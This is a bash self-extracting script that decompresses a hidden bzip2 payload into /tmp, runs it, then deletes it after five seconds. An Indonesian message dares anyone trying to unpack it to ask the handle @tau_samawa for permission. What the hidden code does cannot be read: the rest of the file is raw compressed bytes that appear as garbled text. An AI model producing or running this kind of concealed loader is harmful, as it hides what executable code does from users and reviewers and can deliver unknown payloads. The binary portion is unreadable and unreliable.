#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SYßSA 3��}� �����������PT@  �  �  ��=ʹ��tlҠ(�ɓS
bzdM16��&��ڏH��Ph�yM�z�@B4�?CSQ�6Q���h h    h $M!2�5=M���P�        8 h�� �!�M     a"�	�x�&�d�Ѥ�&�I�j=G�z��  i��R4�E��=\�H���NU~�]�ܡЯ1��ns�$۩y�A3��r��<;��N�ݍl~���0!��l��t��zՑ@t��D:X_VQޫ>F�hB�|���P��j9�U7^gQ�`�q$x��T��cN+��I�Ө1��T��`o������c��)��(u�PhH����@p<w��`�o��e]g0Tڇ�t[��o�X��J�����H���dI2Z��PR��&,75ӂ����H��um���{��$��Q�ǂh�g�ɣ�Q$��Q",��h��H(�k�s��Mw̰pJ~�!��A�;0V뭅@a  PJ����IH��jH�.��:��9�dC8�+Ȣ/���2 �;'}�q��nZ�KC4��̰����-j����m�,,�?�� XY �2p��V��9)t�&G��ڤ�I&�٫W������C6����3j�#"F�v]S�r ��5,�{8�eaT��� \�3Xi�s��v�d;�hқ�e�: %?ri���=-��੤"]�u�U�B�ll�5y����0�t�$�ePX�LL�7�����Qtz��@Lr)T!�<@;���D�í���Bs�G�&ڷh3��;�V쵽�\��0SWѾ��'��j*��&"��NhKG!n֬�$�Fm�.����(q����Z�A�K��� ���T`�!q������_2Jlh'�%��T��	�����
�d\��X���7�Jc�aQLؙ,�Y���8I��xP,��X'G[C%�u���uF������bfg�#�\�u�L����%��=abo��؄<#+��z��l���\L���A��m-�e��q3�oAL��)�dh�`Xb"=C&��`�qU��3H">݆[�:�Uzэ�ϔ����)�
����;zgӎ�2��ee�d�e��W�F���Fv!�e�<�ᰪ��f+��$����8;�֯���I�4kVZԱ�w�4��[I�W��ɔ1(��3��4��s��,ρS
���BÓ̒�p�\�#�(�k�d��!�;�)%\z���rI?�l'����_9�+�6#�}�O<bД�8����@Hɐ�&�%h�n�\-�ZU�/)i�)J�R�@�`A4���H^Urp"��J�Ph�b��Ԋ�)%�P]e����ֱ�+gbꌏ�;��VS�F�"JR�$��I(ܭ�^��(Ј���g"P���q�e�z[���֦�k�/@���"e�7|!V�"���9�[�{YZ��2K�dqp������|��!���$.����@�Ą&I"@ ��3o�rE8P�ßSA